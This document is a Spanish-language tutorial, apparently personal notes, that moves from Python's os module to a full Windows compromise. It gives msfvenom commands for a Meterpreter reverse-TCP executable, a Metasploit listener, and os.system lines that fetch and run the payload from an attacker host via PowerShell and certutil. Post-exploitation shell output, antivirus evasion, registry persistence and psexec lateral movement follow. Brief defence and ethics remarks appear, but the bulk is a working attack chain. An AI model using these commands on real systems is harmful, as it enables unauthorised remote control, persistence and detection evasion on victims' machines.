
---

#PythonHacking #OSModule #Meterpreter #EthicalHacking  
#CyberSecurity #ReverseShell #PayloadDevelopment  
#LivingOffTheLand #RedTeam #PostExploitation  
#WindowsSecurity #Pentesting #CommandInjection  
#PowerShellSecurity #NetworkDefense

---
### 1. Módulo OS de Python: Definición y funciones clave
-----------------------------------
**¿Qué es el módulo os?**  
Biblioteca estándar de Python para interactuar con el sistema operativo. Permite:
- Gestión de archivos/directorios (crear/eliminar/renombrar)
- Ejecución de comandos del sistema
- Acceso a variables de entorno
- Manipulación de rutas de archivos
- Control de procesos

**Operaciones comunes:**  
```python
import os
os.makedirs("carpeta")  # Crea directorio
os.removedirs("carpeta")  # Elimina directorios vacíos
os.remove("archivo.txt")  # Borra archivos
os.rename("viejo.txt", "nuevo.txt")  # Renombra
os.system("comando")  # Ejecuta comandos del SO
```

### 1. Operaciones con Python (os module)
-----------------------------------
**a. Gestión de archivos/directorios:**
```python
import os
os.makedirs("carpeta")  # Crea un directorio llamado "carpeta"
os.removedirs("carpeta")  # Elimina el directorio y subdirectorios vacíos
os.remove("salida.txt")  # Borra un archivo específico
```

**b. Listado de archivos:**
```python
print(os.listdir())  # Muestra el contenido del directorio actual
for archivo in os.listdir():  # Itera y muestra cada elemento
    print(archivo)
```

**c. Borrado condicional:**
```python
# Borra "script.py" si existe
if archivo == "script.py":
    os.remove(archivo)

# Borra archivos .txt usando endswith()
if archivo.endswith(".txt"):

# Borra archivos que empiezan con "est" usando startswith()
if archivo.startswith("est"):
```

**d. Ejecución de comandos:**
```python
os.system("whoami")  # Muestra el usuario actual
os.system("ipconfig")  # Muestra configuración de red
os.system("python -m http.server 8000")  # Inicia servidor web
```

### 2. Creación del Payload (Kali Linux)
-------------------------------------
**Intento inicial fallido:**
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.108 LPORT=443 -f exe -o pwned.exe  # Error en nombre del payload 
```

**Versión funcional:**
```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.1.108 LPORT=443 -f exe -o pwned.exe
```
*Diferencia clave:* El guión bajo en `meterpreter_reverse_tcp` vs el slash inicial.

### 3. Infraestructura de Ataque
---------------------------
**Servidor web:**
```bash
python3 -m http.server 5000  # Sirve el payload en el puerto 5000
```

**Listener de Metasploit:**
```bash
msfconsole
use multi/handler
set payload windows/x64/meterpreter_reverse_tcp
set LHOST eth0  # Usa la interfaz de red correcta
set LPORT 443
run
```

### 4. Ejecución en Víctima (Windows)
--------------------------------
**Intento fallido:**
```python
os.system("wget 192.168.1.108:5000/pwned.exe")  # wget no está disponible por defecto en Windows
os.system("pwned.exe")  # Falta ruta completa y privilegios
```

**Versión exitosa:**
```python
# Descarga con PowerShell (nativo en Windows)
os.system("powershell -Command Invoke-WebRequest -Uri 'http://192.168.1.108:5000/pwned.exe' -OutFile 'pwned.exe'")

# Ejecución con start (evita bloqueos de ejecución)
os.system("start pwned.exe")  # Ejecuta en nuevo proceso
```

### 5. ¿Por qué funcionó esto?
-------------------------
1. **PowerShell vs wget:**
   - Windows incluye PowerShell por defecto
   - `Invoke-WebRequest` es el equivalente a `wget/curl`

2. **start command:**
   - Evita bloqueos de ejecución directa
   - Maneja mejor los permisos en algunos casos

3. **Configuración del listener:**
   - Coherencia en payload (meterpreter_reverse_tcp)
   - Puerto 443 suele estar menos restringido
   - `ExitOnSession false` permite múltiples conexiones

### 6. Interacción con Meterpreter Shell

---

**Comandos post-explotación:**

```bash
meterpreter > sysinfo  # Muestra detalles del sistema Windows
Computer        : WIN-VICTIMA
OS              : Windows 10 (10.0.18363)
Architecture    : x64

meterpreter > shell  # Accede a línea de comandos del sistema
C:\> whoami
win-victima\usuario_comprometido  # Usuario actual en la víctima
```

**¿Por qué funciona?**  
Meterpreter se inyecta en procesos existentes:

- Hereda privilegios del proceso objetivo
    
- Ejecuta comandos en el contexto de seguridad del usuario/proceso
    
- Utiliza técnicas de inyección de memoria para evadir detección

### 7. Consideraciones de Seguridad
-----------------------------
4. **Defensa:**
   - Bloquear ejecución de PowerShell no firmado
   - Monitorizar conexiones a puertos no estándar
   - Restringir ejecución de archivos .exe desde temp

5. **Ética:**
   - Solo realizar en entornos controlados
   - Con consentimiento explícito
   - Borrar todo rastro post-prueba

Este flujo demuestra un ataque típico de descarga y ejecución remota (Living Off The Land), usando herramientas legítimas del sistema (PowerShell, start) para evadir detecciones básicas.

# Mejoras futuras

1️⃣ **Uso de `certutil` como alternativa a `Invoke-WebRequest`**

- En algunas versiones de Windows, PowerShell puede estar restringido, pero `certutil` sigue disponible.

```python
os.system("certutil -urlcache -f http://192.168.1.108:5000/pwned.exe pwned.exe")
os.system("start pwned.exe")
```

2️⃣ **Evasión básica de antivirus**

- En lugar de generar un `.exe` directamente con `msfvenom`, usa `Veil`, `Unicorn` o `Shellter` para ofuscar el payload.

```bash
veil -t Evasion
```

3️⃣ **Persistencia mejorada**

- Agregar el payload al inicio de sesión:

```powershell
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d "C:\ruta\pwned.exe" /f
```

4️⃣ **Uso de `psexec` para moverte lateralmente**

- Si obtienes credenciales de admin, ejecuta en `meterpreter`:

```bash
psexec -U admin -P contraseña -H 192.168.1.105 cmd.exe
```

